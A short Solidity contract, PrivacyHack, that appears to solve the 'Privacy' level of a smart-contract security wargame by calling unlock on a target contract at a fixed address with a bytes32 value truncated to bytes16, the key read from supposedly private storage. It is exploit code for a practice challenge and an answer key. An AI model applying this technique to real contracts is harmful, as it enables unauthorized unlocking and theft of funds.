// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Privacy.sol";

contract PrivacyHack {

  Privacy target;

  constructor() public{
    target = Privacy(0x13d549CB5431961Bb5f2F8a502ecF754e9CEC562);
  }

  function attack(bytes32 _data) public{
    target.unlock(bytes16(_data));
  }


}
